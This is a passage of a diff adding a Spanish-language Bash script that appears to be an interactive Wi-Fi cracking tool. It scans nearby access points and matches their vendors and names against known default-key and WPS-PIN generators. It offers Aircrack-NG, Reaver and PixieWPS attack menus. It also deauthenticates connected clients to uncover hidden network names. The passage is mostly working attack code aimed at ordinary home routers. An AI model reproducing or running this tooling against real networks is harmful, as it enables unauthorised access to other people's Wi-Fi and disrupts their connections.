+					echo "▶ Ataque Wlanreaver (WEP) + algoritmo $KEYGEN[0m $VULNERABLE|AtaqueWlanreaver|$KEYGEN"
+				done
+			else
+				echo "▶ Ataque Aircrack-NG (WEP) estandar[0m |AtaqueAircrackWEP"
+			fi
+		fi
+		
+		if [ "${CIFRADO:0:3}" = "WPA" ] && [ "$KEYGEN_WEPWPA" ]; then
+			
+			echo "$KEYGEN_WEPWPA"|while read KEYGEN VULNERABLE; do
+				
+				if [ "$VULNERABLE" = "OK" ]; then
+					
+					VULNERABLE="[0;42mVULNERABLE[0m"
+					
+				elif [ "$VULNERABLE" = "¿?" ]; then
+					
+					VULNERABLE="[0;43mVULNERABLE?[0m"
+				else
+					unset VULNERABLE
+				fi
+				
+				echo "▶ Ataque Aircrack-NG (WPA) + algoritmo $KEYGEN[0m $VULNERABLE|AtaqueAircrackWPA|$KEYGEN"
+			done
+			
+			echo "$KEYGEN_WEPWPA"|while read KEYGEN VULNERABLE; do
+				
+				if [ "$VULNERABLE" = "OK" ]; then
+					
+					VULNERABLE="[0;42mVULNERABLE[0m"
+					
+				elif [ "$VULNERABLE" = "¿?" ]; then
+					
+					VULNERABLE="[0;43mVULNERABLE?[0m"
+				else
+					unset VULNERABLE
+				fi
+				
+				echo "▶ Ataque Airlin (WPA) + algoritmo $KEYGEN[0m $VULNERABLE|AtaqueAirlin|$KEYGEN"
+			done
+		fi
+		
+		if [ "$WPS" != "NO" ]; then
+			
+			if [ "$(echo "$KEYGEN_WPS"|grep "^PINGENERICO OK")" ]; then
+				
+				VULNERABLE="[0;42mVULNERABLE[0m"
+				
+			elif [ "$(echo "$KEYGEN_WPS"|grep "^PINGENERICO ¿?")" ]; then
+				
+				VULNERABLE="[0;43mVULNERABLE?[0m"
+			else
+				unset VULNERABLE
+			fi
+			
+			echo "▶ Ataque Reaver (WPS) + todos los posibles PINes[0m |AtaqueReaver"
+			echo "▶ Ataque Reaver (WPS) + PIN genérico conocido[0m $VULNERABLE|AtaqueReaver|PINGENERICO"
+			
+			KEYGENS="PixieWPS ComputePIN EasyboxWPS DlinkPingen BelkinPingen TRENDnetWPS"
+			[ "$(echo "$KEYGEN_WPS"|grep "^FTE_Keygen")" ] && KEYGENS="$(echo "FTE_Keygen $KEYGENS")"
+			
+			for KEYGEN in $KEYGENS; do
+				
+				if [ "$(echo "$KEYGEN_WPS"|grep "^$KEYGEN OK")" ]; then
+					
+					VULNERABLE="[0;42mVULNERABLE[0m"
+					
+				elif [ "$(echo "$KEYGEN_WPS"|grep "^$KEYGEN ¿?")" ]; then
+					
+					VULNERABLE="[0;43mVULNERABLE?[0m"
+				else
+					unset VULNERABLE
+				fi
+				
+				echo "▶ Ataque Reaver (WPS) + algoritmo $KEYGEN[0m $VULNERABLE|AtaqueReaver|$KEYGEN"
+			done
+		fi
+		
+	) >"$TMP/AtaquesDisponibles.txt"
+	
+	if [ $(cat "$TMP/AtaquesDisponibles.txt"|grep -vc "^$") -eq 0 ]; then
+		
+		echo
+		echo  "[0;31m - No hay ataques disponibles para este objetivo, no se puede continuar[0m"
+		
+		sleep 3
+		MenuPrincipal
+	fi
+	
+	N=0
+	while read LINEA; do
+		
+		N=$(($N+1))
+		ATAQUE[$N]="$(echo "$LINEA"|awk -F'|' '{print $1}')"
+		ORDEN[$N]="$(echo "$LINEA"|awk -F'|' '{print $2}')"
+		KEYGEN[$N]="$(echo "$LINEA"|awk -F'|' '{print $3}')"
+		
+	done <"$TMP/AtaquesDisponibles.txt"
+	
+	SELECT=1
+	GUARDAR=0
+	while [ $GUARDAR -eq 0 ]; do
+		
+		unset RESALTAR
+		RESALTAR[$SELECT]="[48;5;21m"
+		Clear
+		Cabecera
+		
+		echo
+		echo " [0;32mAtaques disponibles para el objetivo seleccionado:[0m"
+		echo
+		
+		for ((X=1;$X<=$N;X++)); do
+			
+			echo " ${RESALTAR[$X]}${ATAQUE[$X]}[0m"
+		done
+		
+		echo
+		echo " ${RESALTAR[$(($N+1))]}◀ Volver al menú principal[0m"
+		
+		while read -sn1 TECLA; do
+			
+			LeerTecla
+			
+			case "$TECLA" in
+				
+				$'\e[A'|$'\e[A'$'\e[A'$'\e[A'|w|W) [ $SELECT -gt 1 ] && SELECT=$(($SELECT-1)); break;;
+				$'\e[B'|$'\e[B'$'\e[B'$'\e[B'|s|S) [ $SELECT -lt $(($N+1)) ] && SELECT=$(($SELECT+1)); break;;
+				$'\e[D'|a|A) GUARDAR=1; MenuPrincipal; break;; 
+			     ''|$'\e[C'|d|D) GUARDAR=1; break;; 
+			esac
+		done
+	done
+	
+	if [ $SELECT -eq $(($N+1)) ]; then
+		
+		MenuPrincipal
+	else
+		KEYGEN="${KEYGEN[$SELECT]}"
+		${ORDEN[$SELECT]}
+	fi
+}
+
+DescubrirESSID() {
+	
+	Clear
+	Cabecera
+	sleep 0.5
+	SeleccionarInterfaceAuto
+	
+	if [ ! "$(iwconfig 2>/dev/null|grep "^$IFACE_MON "|grep "Mode:Monitor")" ]; then
+		
+		MontarMonitor
+		sleep 3
+	fi
+	
+	Clear
+	rm -f "$CAPTURAS/$BSSID"*csv "$CAPTURAS/$BSSID"*xml "$CAPTURAS/$BSSID"*cap "$TMP/"aireplay*.txt
+	killall airodump-ng aireplay-ng >/dev/null 2>&1
+	trap "killall airodump-ng aireplay-ng >/dev/null 2>&1; break" SIGINT
+	(airodump-ng $IFACE_MON -a --bssid $BSSID -c $CANAL -w "$CAPTURAS/$BSSID" >/dev/null 2>&1 &) 
+	while [ ! "$(pgrep "airodump-ng")" ] || [ ! -e "$CAPTURAS/$BSSID-01.csv" ]; do sleep 1; done
+	unset CLIENTES ESSID ESSID_OCULTO
+	
+	N=0
+	while [ "$(pgrep "airodump-ng")" ]; do
+		
+		sleep 0.5
+		
+		InfoObjetivo1
+		
+		if [ "$CLIENTES" ]; then
+			
+			[ $N -gt 0 ] && N=$(($N-1))
+			
+			if [ $N -eq 0 -a ! -f "$TMP/aireplay-0.txt" ]; then
+				
+				(DesautenticarClientes &)
+				N=40
+			fi
+			
+			echo
+			echo "[0;32m - Clientes encontrados:[0m $(echo -n "$CLIENTES"|tr '\n' ' ')"
+			
+			if [ -f "$TMP/aireplay-0.txt" ]; then
+				
+				echo
+				echo "[0;32m - Desautenticando clientes...[0m"
+			fi
+		else
+			echo
+			echo "[0;32m - Esperando clientes...[0m"
+		fi
+		
+		CLIENTES="$(grep "$BSSID" "$CAPTURAS/$BSSID-01.csv"|egrep -v "^$BSSID|not associated"|awk -F ',' '{print $1}')"
+		ESSID_OCULTO="$(grep -am1 "^$BSSID" "$CAPTURAS/$BSSID-01.csv"|rev|cut -d',' -f2-|rev|cut -d',' -f14-|sed 's/^ //g'|sed 's/ $//g')"
+		
+		if [ "$ESSID_OCULTO" ]; then
+			
+			ESSID="$ESSID_OCULTO"
+			
+			N=$(cat "$RAIZ/objetivos.sh"|grep "$BSSID"|grep -o "\[[0-9]*\]"|tr -d '[]')
+			[ "$WPS" != "NO" ] && CheckPatronesConocidos WPS
+			[ "$CIFRADO" != "OPN" ] && CheckPatronesConocidos ${CIFRADO:0:3}
+			sed -i "s/ESSID\[$N\]=[[:print:]]*/ESSID\[$N\]=\"$ESSID\"/" "$RAIZ/objetivos.sh"
+			sed -i "s/SOPORTADA_WEPWPA\[$N\]=[[:print:]]*/SOPORTADA_WEPWPA\[$N\]=\"${SOPORTADA_WEPWPA[$N]}\"/" "$RAIZ/objetivos.sh"
+			sed -i "s/KEYGEN_WEPWPA\[$N\]=[[:print:]]*/KEYGEN_WEPWPA\[$N\]=\"${KEYGEN_WEPWPA[$N]}\"/" "$RAIZ/objetivos.sh"
+			sed -i "s/SOPORTADA_WPS\[$N\]=[[:print:]]*/SOPORTADA_WPS\[$N\]=\"${SOPORTADA_WPS[$N]}\"/" "$RAIZ/objetivos.sh"
+			sed -i "s/KEYGEN_WPS\[$N\]=[[:print:]]*/KEYGEN_WPS\[$N\]=\"${KEYGEN_WPS[$N]}\"/" "$RAIZ/objetivos.sh"
+			sed -i "s/PIN_GENERICO\[$N\]=[[:print:]]*/PIN_GENERICO\[$N\]=\"${PIN_GENERICO[$N]}\"/" "$RAIZ/objetivos.sh"
+			
+			KEYGEN_WEPWPA="$(echo "${KEYGEN_WEPWPA[$N]}"|tr '|' '\n')"
+			KEYGEN_WPS="$(echo "${KEYGEN_WPS[$N]}"|tr '|' '\n')"
+			PIN_GENERICO="${PIN_GENERICO[$N]}"
+			SOPORTADA_WEPWPA="${SOPORTADA_WEPWPA[$N]}"
+			SOPORTADA_WPS="${SOPORTADA_WPS[$N]}"
+			
+			echo
+			echo "[0;32m - ESSID encontrado:[0m $ESSID"
+			break
+		else
+			echo
+			echo "[0;32m - Esperando ESSID...[0m"
+		fi
+	done
+	
+	if [ ! "$ESSID_OCULTO" ]; then
+		
+		echo
+		echo  "[0;31m - No ha sido posible descubrir el ESSID, no se puede continuar[0m"
+	fi
+	
+	echo
+	echo "[0;32m - Presiona cualquier tecla para volver al menú principal[0m"
+	
+	while read -sn1 TECLA; do
+		
+		LeerTecla
+		break
+	done
+	
+	killall airodump-ng aireplay-ng >/dev/null 2>&1
+}
+##########################################################################
+##########################################################################
+
+
+##########################################################################
+##########################################################################
+## BUSCAR PATRONES Y SELECCIONAR OBJETIVO
+
+SeleccionarObjetivo() {
+	
+	[ -f "$RAIZ/objetivos.sh" ] && source "$RAIZ/objetivos.sh"
+	[ ! "$N_OBJETIVOS" ] && N_OBJETIVOS=0
+	
+	if [ $N_OBJETIVOS -le 0 ]; then
+		
+		Clear
+		Cabecera
+		sleep 0.5
+		
+		echo
+		echo  "[0;31m - No se ha encontrado ningun objetivo, no se puede continuar[0m"
+		
+		sleep 3
+		unset ESSID BSSID CANAL CIFRADO PWR WPS 
+		MenuPrincipal
+	fi
+	
+	case $FILTRO in
+		
+		NO ) N_FILTRO=$N_OBJETIVOS;;
+		WEP ) N_FILTRO=$(cat "$RAIZ/objetivos.sh"|grep "^CIFRADO"|grep "WEP"|wc -l);;
+		WPA ) N_FILTRO=$(cat "$RAIZ/objetivos.sh"|grep "^CIFRADO"|grep "WPA"|wc -l);;
+		WPS ) N_FILTRO=$(cat "$RAIZ/objetivos.sh"|grep "^WPS"|egrep "SI|LOCK"|wc -l);;
+	esac
+	
+	N1=$N_FILTRO
+	N=$N_OBJETIVOS
+	
+	while [ 0 -le $N ]; do
+		
+		CIFRADO="${CIFRADO[$N]}"
+		WPS="${WPS[$N]}"
+		
+		if [ "$FILTRO" != "NO" ]; then
+			
+			if [ "$FILTRO" = "WPS" ]; then
+				
+				[ "$WPS" = "NO" ] && N=$(($N-1)) && continue
+			else
+				[ "$FILTRO" != "${CIFRADO:0:3}" ] && N=$(($N-1)) && continue
+			fi
+		fi
+		
+		BSSID="${BSSID[$N]}"
+		ESSID="${ESSID[$N]}"
+		CANAL=${CANAL[$N]}
+		PWR=${PWR[$N]}
+		SOPORTADA_WEPWPA="${SOPORTADA_WEPWPA[$N]}"
+		SOPORTADA_WPS="${SOPORTADA_WPS[$N]}"
+		
+		if [ -f "$CLAVES/${ESSID////#}_${BSSID//:/-}.txt" ]; then
+			
+			MARCA="[0;32m√[0m"
+			
+		elif [ "${CIFRADO:0:3}" = "OPN" ]; then
+			
+			MARCA="[0;32m●[0m"
+			CIFRADO="NO  "
+			
+		elif [ "${CIFRADO:0:3}" = "WPA" ] && [ ! "$SOPORTADA_WEPWPA" ] && [ "$WPS" = "NO" ]; then
+			
+			MARCA="[0;31m✖[0m"
+			
+		else
+			MARCA=" "
+		fi
+		
+		[ ${#CIFRADO} -eq 3 ] && CIFRADO="$CIFRADO "
+		[ ${#WPS} -eq 2 ] && WPS=" $WPS "
+		[ $CANAL -lt 10 ] && CANAL="$CANAL "
+		while [ ${#ESSID} -lt 13 ]; do ESSID="$ESSID "; done 
+		
+		if [ "$SOPORTADA_WEPWPA" = "SI" ]; then
+			
+			CIFRADO="[0;42m$CIFRADO[0m"
+			
+		elif [ "$SOPORTADA_WEPWPA" = "¿?" ]; then
+			
+			CIFRADO="[0;43m$CIFRADO[0m"
+		fi
+		
+		if [ "$SOPORTADA_WPS" = "SI" ]; then
+			
+			WPS="[0;42m$WPS[0m"
+		
+		elif [ "$SOPORTADA_WPS" = "¿?" ]; then
+			
+			WPS="[0;43m$WPS[0m"
+		fi
+		
+		if [ "$FABRICANTES" = "SI" ]; then
+			
+			FABRICANTE="$(grep -m1 "$(echo "${BSSID:0:8}"|tr ':' '-')" "/etc/aircrack-ng/airodump-ng-oui.txt" 2>/dev/null|awk -F'\t' '{print $3}')"
+			[ ! "$FABRICANTE" ] && FABRICANTE="Desconocido"
+			ESSID="${ESSID:0:13}"
+			#FABRICANTE="${FABRICANTE:0:15}"
+			#while [ ${#FABRICANTE} -lt 16 ]; do FABRICANTE="$FABRICANTE "; done 
+		else
+			unset FABRICANTE
+		fi
+		
+		XBSSID[$N1]="$BSSID"
+		XESSID[$N1]="$ESSID"
+		XCIFRADO[$N1]="$CIFRADO"
+		XCANAL[$N1]="$CANAL"
+		XWPS[$N1]="$WPS"
+		XPWR[$N1]=$PWR
+		XMARCA[$N1]="$MARCA"
+		XFABRICANTE[$N1]="$FABRICANTE"
+		
+		N1=$(($N1-1))
+		N=$(($N-1))
+	done
+	
+	Clear
+	
+	MAX=21
+	[ $MAX -gt $N_FILTRO ] && MAX=$N_FILTRO
+	SELECT=1
+	GUARDAR=0
+	
+	while [ $GUARDAR -eq 0 ]; do
+		
+		unset RESALTAR
+		RESALTAR[$SELECT]="[48;5;21m"
+		Clear
+		
+		echo " [0;32mFiltro =[0m [1;33m$FILTRO[0m [0;32mMostrar fabricante =[0m [1;33m$FABRICANTES[0m ($N_FILTRO objetivos)"
+		echo " [0;32mOpciones:[0m [C] para configurar listado"
+		echo "           [L] para ver significado de colores y símbolos"
+		echo
+		echo -n "         BSSID        Canal  Cifrado  WPS  Señal  ESSID"
+		[ "$FABRICANTES" = "SI" ] && echo -n "             Fabricante"
+		echo
+		
+		[ $SELECT -lt $N_FILTRO -a $N_FILTRO -gt $MAX ] && echo " ▶ ..."||echo
+		[ $SELECT -gt $MAX ] && N1=$(($SELECT-$MAX))||N1=0
+		[ $SELECT -gt $N_FILTRO ] && N1=$(($N_FILTRO-$MAX))
+		
+		for ((N=$(($N1+$MAX));N>$N1;N--)); do
+			
+			echo " ${RESALTAR[$N]}▶ ${XBSSID[$N]}    ${XCANAL[$N]}    ${XCIFRADO[$N]}${RESALTAR[$N]}   ${XWPS[$N]}${RESALTAR[$N]}   ${XPWR[$N]}%   ${XESSID[$N]}[0m ${XMARCA[$N]}   ${XFABRICANTE[$N]}"
+			
+		done
+		
+		[ $SELECT -gt $MAX ] && echo " ▶ ..."||echo
+		echo " ${RESALTAR[0]}◀ Volver al menú principal[0m"
+		
+		while read -sn1 TECLA; do
+			
+			LeerTecla
+			
+			case "$TECLA" in
+				
+				$'\e[A'|$'\e[A'$'\e[A'$'\e[A'|w|W) [ $SELECT -lt $N_FILTRO ] && SELECT=$(($SELECT+1)); break;;
+				$'\e[B'|$'\e[B'$'\e[B'$'\e[B'|s|S) [ $SELECT -gt 0 ] && SELECT=$(($SELECT-1)); break;;
+				$'\e[D'|a|A) GUARDAR=1; SELECT=0; break;;
+			     ''|$'\e[C'|d|D) GUARDAR=1; break;;
+				       c|C ) GUARDAR=1; ConfigurarListaObjetivos; GuardarConfiguracion; SeleccionarObjetivo; break;;
+				       l|L ) GUARDAR=1; Leyenda; SeleccionarObjetivo; break;;
+			esac
+		done
+	done
+	
+	if [ $SELECT -eq 0 ]; then
+		
+		unset ESSID BSSID CANAL CIFRADO WPS KEYGEN_WEPWPA KEYGEN_WPS PIN_GENERICO SOPORTADA_WEPWPA SOPORTADA_WPS
+		MenuPrincipal
+	else
+		SELECT="$(cat "$RAIZ/objetivos.sh"|grep "${XBSSID[$SELECT]}"|cut -d'[' -f2|cut -d']' -f1)"
+		ESSID="${ESSID[$SELECT]}"
+		BSSID="${BSSID[$SELECT]}"
+		CANAL="${CANAL[$SELECT]}"
+		CIFRADO="${CIFRADO[$SELECT]}"
+		WPS="${WPS[$SELECT]}"
+		KEYGEN_WEPWPA="$(echo "${KEYGEN_WEPWPA[$SELECT]}"|tr '|' '\n')"
+		KEYGEN_WPS="$(echo "${KEYGEN_WPS[$SELECT]}"|tr '|' '\n')"
+		PIN_GENERICO="${PIN_GENERICO[$SELECT]}"
+		SOPORTADA_WEPWPA="${SOPORTADA_WEPWPA[$SELECT]}"
+		SOPORTADA_WPS="${SOPORTADA_WPS[$SELECT]}"
+	fi
+	
+	if [ "$ESSID" = "< Oculto >" ]; then
+		
+		Clear
+		Cabecera
+		sleep 0.5
+		SELECT=1
+		GUARDAR=0
+		while [ $GUARDAR -eq 0 ]; do
+			
+			Clear
+			Cabecera
+			unset RESALTAR
+			RESALTAR[$SELECT]="[48;5;21m"
+			
+			echo
+			echo " [0;32mEl objetivo seleccionado tiene el ESSID oculto[0m"
+			echo
+			echo " ${RESALTAR[1]}▶ Descubrir ESSID[0m"
+			echo
+			echo " ${RESALTAR[2]}◀ Seleccionar otro objetivo[0m"
+			
+			while read -sn1 TECLA; do
+				
+				LeerTecla
+				
+				case "$TECLA" in
+					
+					$'\e[A'|$'\e[A'$'\e[A'$'\e[A'|w|W) [ $SELECT -gt 1 ] && SELECT=$(($SELECT-1)); break;;
+					$'\e[B'|$'\e[B'$'\e[B'$'\e[B'|s|S) [ $SELECT -lt 2 ] && SELECT=$(($SELECT+1)); break;;
+					$'\e[D'|a|A) GUARDAR=1; SeleccionarObjetivo; break;;
+				     ''|$'\e[C'|d|D)
+						case $SELECT in
+							
+							1) GUARDAR=1; DescubrirESSID; break;;
+							2) GUARDAR=1; SeleccionarObjetivo; break;;
+						esac
+					;;
+				esac
+			done
+		done
+	fi
+}
+
+Leyenda() {
+	
+	Clear
+	Cabecera
+	sleep 0.5
+	
+	echo  " [0;32mCOLORES:[0m"
+	echo " [0;42mWEP[0m/[0;42mWPA[0m/[0;42mWPA2[0m -> Existe generador de claves compatible"
+	echo " [0;43mWEP[0m/[0;43mWPA[0m/[0;43mWPA2[0m -> Existe generador de claves posiblemente compatible"
+	echo " [0;42mSI[0m/[0;42mLOCK[0m -> Existe generador de pines compatible"
+	echo " [0;43mSI[0m/[0;43mLOCK[0m -> Existe generador de pines posiblemente compatible"
+	echo
+	echo " NOTA: Si aparece LOCK en la columna de WPS, significa que el WPS está"
+	echo " bloqueado, por tanto no será posible probar pines"
+	echo
+	echo " [0;32mSÍMBOLOS:[0m"
+	echo " [0;32m√[0m -> La clave de esté objetivo ya está almacenada"
+	echo " [0;32m●[0m -> El objetivo no tiene cifrado, es una red abierta"
+	echo " [0;31m✖[0m -> No existen generadores de claves ni de pines para este objetivo"
+	echo
+	echo " - Presiona cualquier tecla para volver a la lista de objetivos"
+	
+	while read -sn1 TECLA; do
+		
+		LeerTecla
+		break
+	done
+}
+
+EscanearObjetivos() {
+	
+	if [ "$ESCANER" = "DixieScan" ]; then
+		
+		EscanearObjetivosDixieScan
+	else
+		EscanearObjetivosAirodump
+	fi
+}
+
+EscanearObjetivosDixieScan() {
+	
+	Clear
+	Cabecera
+	sleep 0.5
+	SeleccionarInterfaceAuto
+	
+	if [ ! "$(iwconfig 2>/dev/null|grep "^$IFACE_MON "|grep "Mode:Monitor")" ]; then
+		
+		MontarMonitor
+	fi
+	
+	unset ESSID BSSID CANAL CIFRADO PWR WPS SOPORTADA_WEPWPA KEYGEN_WEPWPA SOPORTADA_WPS KEYGEN_WPS PINGENERICO
+	
+	echo
+	echo " - Escaneando en busca de objetivos... [s"
+	
+	killall DixieScan >/dev/null 2>&1
+	rm -rf "$CAPTURAS/DixieScan.txt"
+	
+	if [ $SCAN_CHANNEL -ne 0 ]; then
+		
+		CHANNEL="--canal $SCAN_CHANNEL"
+	else
+		unset CHANNEL
+	fi
+	
+	DixieScan -i "$IFACE_MON" $CHANNEL -I 8 -D -t $SCAN_TIME -o "$CAPTURAS/DixieScan.txt" -d '|' >/dev/null 2>&1
+	trap "killall -s INT DixieScan >/dev/null 2>&1" SIGINT
+	sleep 1
+	
+	SEGUNDOS=$SCAN_TIME
+	while [ -e "/proc/$AIRODUMP_PID" -a $SEGUNDOS -gt -1 ]; do
+		
+		echo -n "\[u[0;32m$SEGUNDOS [0msegundos [K"
+		
+		sleep 1
+		SEGUNDOS=$(($SEGUNDOS-1))
+	done
+	
+	[ ! -f "$CAPTURAS/DixieScan.txt" ] && echo "[u[0;31mERROR[0m" && sleep 3 && MenuPrincipal
+	
+	echo "[u[0;32m√ [0m [K"
+	
+	killall -s INT DixieScan >/dev/null 2>&1
+	cat "$CAPTURAS/DixieScan.txt"|cut -d'|' -f2-|sort -t'|' -k3 -n -r -o "$TMP/objetivos.txt"
+	
+	echo
+	echo -n " - Buscando patrones conocidos... "
+	
+	N=0
+	while IFS='|' read BSSID CIFRADO PWR CANAL WPS_VER WPS ESSID WPS_METHODS; do
+		
+		N=$(($N+1))
+		PWR=$(($PWR+120))
+		[ $PWR -gt 100 ] && PWR=100
+		
+		if [ "$CIFRADO" = "OPEN" ]; then
+			
+			CIFRADO="OPN"
+		else
+			CheckPatronesConocidos ${CIFRADO:0:3}
+		fi
+		
+		if [ "$WPS" = "---" ] || [ ! "$(echo "$WPS_METHODS"|grep "LAB")" ]; then 
+			
+			WPS="NO"
+		else
+			[ "$WPS" = "N" ] && WPS="SI"||WPS="LOCK"
+			CheckPatronesConocidos WPS
+		fi
+		
+		echo "ESSID[$N]=\"$ESSID\""
+		echo "BSSID[$N]=\"$BSSID\""
+		echo "CANAL[$N]=$CANAL"
+		echo "CIFRADO[$N]=\"$CIFRADO\""
+		echo "PWR[$N]=$PWR"
+		echo "WPS[$N]=\"$WPS\""
+		echo "SOPORTADA_WEPWPA[$N]=\"${SOPORTADA_WEPWPA[$N]}\""
+		echo "KEYGEN_WEPWPA[$N]=\"${KEYGEN_WEPWPA[$N]}\""
+		echo "SOPORTADA_WPS[$N]=\"${SOPORTADA_WPS[$N]}\""
+		echo "KEYGEN_WPS[$N]=\"${KEYGEN_WPS[$N]}\""
+		echo "PIN_GENERICO[$N]=\"${PIN_GENERICO[$N]}\""
+		echo "#################################################"
+		
+	done <"$TMP/objetivos.txt" >"$RAIZ/objetivos.sh"
+	
+	echo "N_OBJETIVOS=$N" >>"$RAIZ/objetivos.sh"
+	echo "[0;32m√ [0m"
+	
+	SeleccionarObjetivo
+}
+
+EscanearObjetivosAirodump() {
+	
+	Clear
+	Cabecera
+	sleep 0.5
+	SeleccionarInterfaceAuto
+	
+	if [ ! "$(iwconfig 2>/dev/null|grep "^$IFACE_MON "|grep "Mode:Monitor")" ]; then
+		
+		MontarMonitor
+	fi
+	
+	unset ESSID BSSID CANAL CIFRADO PWR WPS SOPORTADA_WEPWPA KEYGEN_WEPWPA SOPORTADA_WPS KEYGEN_WPS PINGENERICO
+	
+	echo
+	echo " - Escaneando en busca de objetivos... [s"
+	
+	killall airodump-ng >/dev/null 2>&1
+	
+	if [ $SCAN_CHANNEL -ne 0 ]; then
+		
+		CHANNEL="--channel $SCAN_CHANNEL"
+	else
+		unset CHANNEL
+	fi
+	
+	airodump-ng "$IFACE_MON" -a $CHANNEL -w "$CAPTURAS/captura" >/dev/null 2>&1 & AIRODUMP_PID=$!
+	trap "kill -s INT $AIRODUMP_PID >/dev/null 2>&1" SIGINT
+	sleep 1
+	
+	SEGUNDOS=$SCAN_TIME
+	while [ -e "/proc/$AIRODUMP_PID" -a $SEGUNDOS -gt -1 ]; do
+		
+		echo -n "[u[0;32m$SEGUNDOS [0msegundos [K"
+		
+		sleep 1
+		SEGUNDOS=$(($SEGUNDOS-1))
+	done
+	
+	[ ! -f "$CAPTURAS/captura-01.csv" ] && echo "[u[0;31mERROR[0m" && sleep 3 && MenuPrincipal
+	
+	echo "[u[0;32m√ [0m [K"
+	
+	kill -s INT $AIRODUMP_PID >/dev/null 2>&1
+	
+	echo
+	echo -n " - Identificando objetivos con WPS activado... "
+	
+	[ "$(wash -h 2>&1|grep "^Wash")" ] && C="-C"||unset C
+	wash $C -f "$CAPTURAS/captura-01.cap" 2>/dev/null|tail +3|awk '{print $1,$5}' >"$TMP/BSSIDs_WPS.txt"
+	[ $? -ne 0 ] && echo "[0;31mERROR[0m" && sleep 3 && Salir
+	
+	echo "[0;32m√ [0m"
+	echo
+	echo -n " - Buscando patrones conocidos... "
+	
+	CORTE=$(($(cat "$CAPTURAS/captura-01.csv"|grep -an "Station"|cut -d':' -f1)-4))
+	cat "$CAPTURAS/captura-01.csv"|tail +3|head -$CORTE|\
+	sort -t',' -k9 -n -r -o "$TMP/objetivos.txt"
+	BSSIDs_WPS="$(cat "$TMP/BSSIDs_WPS.txt")"
+	
+	N=0
+	while IFS=$'\n' read LINEA; do
+		
+		PWR=$(echo "$LINEA"|awk -F ',' '{print $9}'|tr -d ' ')
+		CANAL=$(echo "$LINEA"|awk -F ',' '{print $4}'|tr -d ' ')
+		
+		#if [ $PWR -ne -1 -a $PWR -ge -100 ] && [ $CANAL -ge 1 -a $CANAL -le 15 ]; then
+		if [ $PWR -ne -1 ] && [ $CANAL -ge 1 -a $CANAL -le 15 ]; then
+			
+			N=$(($N+1))
+			PWR=$(($PWR+120))
+			[ $PWR -gt 100 ] && PWR=100
+			BSSID="$(echo "$LINEA"|awk -F ',' '{print $1}')"
+			ESSID="$(echo "$LINEA"|rev|cut -d',' -f2-|rev|cut -d',' -f14-|sed 's/^ //g'|sed 's/ $//g')"
+			CIFRADO="$(echo "$LINEA"|awk -F ',' '{print $6}'|cut -b 2-5|tr -d ' ')"
+			[ ! "$ESSID" ] && ESSID="< Oculto >"
+			CHECK_WPS="$(echo "$BSSIDs_WPS"|grep "$BSSID")"
+			
+			if [ "$CHECK_WPS" ]; then 
+				
+				[ "$(echo "$CHECK_WPS"|grep "Yes")" ] && WPS="LOCK"||WPS="SI"
+				CheckPatronesConocidos WPS
+			else
+				WPS="NO"
+			fi
+			
+			[ "$CIFRADO" != "OPN" ] && CheckPatronesConocidos ${CIFRADO:0:3}
+			
+			echo "ESSID[$N]=\"$ESSID\""
+			echo "BSSID[$N]=\"$BSSID\""
+			echo "CANAL[$N]=$CANAL"
+			echo "CIFRADO[$N]=\"$CIFRADO\""
+			echo "PWR[$N]=$PWR"
+			echo "WPS[$N]=\"$WPS\""
+			echo "SOPORTADA_WEPWPA[$N]=\"${SOPORTADA_WEPWPA[$N]}\""
+			echo "KEYGEN_WEPWPA[$N]=\"${KEYGEN_WEPWPA[$N]}\""
+			echo "SOPORTADA_WPS[$N]=\"${SOPORTADA_WPS[$N]}\""
+			echo "KEYGEN_WPS[$N]=\"${KEYGEN_WPS[$N]}\""
+			echo "PIN_GENERICO[$N]=\"${PIN_GENERICO[$N]}\""
+			echo "#################################################"
+		fi
+	done <"$TMP/objetivos.txt" >"$RAIZ/objetivos.sh"
+	
+	echo "N_OBJETIVOS=$N" >>"$RAIZ/objetivos.sh"
+	echo "[0;32m√ [0m"
+	
+	SeleccionarObjetivo
+}
+
+CheckPatronesConocidos() {
+	
+	unset SOPORTADA KEYGEN PINGENERICO
+	echo "$MACs_DB"|egrep "^\?\?:\?\?:\?\?"$'\t'"$1|^${BSSID:0:8}"$'\t'"$1" >"$TMP/DB_CHECK.txt"
+	
+	while IFS=$'\t' read DB_BSSID DB_CIFRADO DB_KEYGEN DB_ESSID DB_PINGENERICO; do
+		
+		CHECKESSID="$(echo "$DB_ESSID"|tr -d '?')"
+		[ "$DB_KEYGEN" = "PINGENERICO" ] && PINGENERICO="${DB_PINGENERICO}${PINGENERICO}"
+		
+		if [ ${#CHECKESSID} -ne 0 ] && [ "$CHECKESSID" = "${ESSID:0:${#CHECKESSID}}" ] && [ ${#DB_ESSID} -eq ${#ESSID} ]; then
+			
+			KEYGEN="$(echo "$KEYGEN"|sed "s/$DB_KEYGEN ¿?//g")"
+			DB_KEYGEN="$DB_KEYGEN OK"
+			
+		elif [ "$DB_BSSID" != "??:??:??" ]; then
+			
+			[ "$(echo "$KEYGEN"|grep "$DB_KEYGEN OK")" ] && unset DB_KEYGEN||DB_KEYGEN="$DB_KEYGEN ¿?"
+		else
+			unset DB_KEYGEN
+		fi
+		
+		if [ "$DB_KEYGEN" ]; then
+			
+			[ "$KEYGEN" ] && KEYGEN="$KEYGEN|$DB_KEYGEN"||KEYGEN="$DB_KEYGEN"
+		fi
+		
+		unset DB_KEYGEN CHECKESSID
+		
+	done <"$TMP/DB_CHECK.txt"
+	
+	KEYGEN="$(echo "$KEYGEN"|tr '|' '\n'|sort -u)"
+	
+	[[ "$KEYGEN" = *EasyboxWPS* ]] && [ "$(echo "$ESSID"|egrep -x "WiFi[[:xdigit:]]{6}|Orange-[[:xdigit:]]*")" ] && KEYGEN="$(echo "$KEYGEN"|grep -v "EasyboxWPS")"
+	[[ "$KEYGEN" = *ono4xx* ]] && [ ! "$(echo "$ESSID"|egrep -x "ONO[0-9]{4}")" ] && KEYGEN="$(echo "$KEYGEN"|grep -v "ono4xx")"
+	[[ "$KEYGEN" = *wlan4xx* ]] && [ ! "$(echo "$ESSID"|egrep -x "WLAN[[:xdigit:]]{6}|YACOM[[:xdigit:]]{6}|WiFi[[:xdigit:]]{6}")" ] && KEYGEN="$(echo "$KEYGEN"|grep -v "wlan4xx")"
+	[[ "$KEYGEN" = *wpamagickey* ]] && [ ! "$(echo "$ESSID"|egrep -x "WLAN_[[:xdigit:]]{4}")|JAZZTEL_[[:xdigit:]]{4}" ] && KEYGEN="$(echo "$KEYGEN"|grep -v "wpamagickey")"
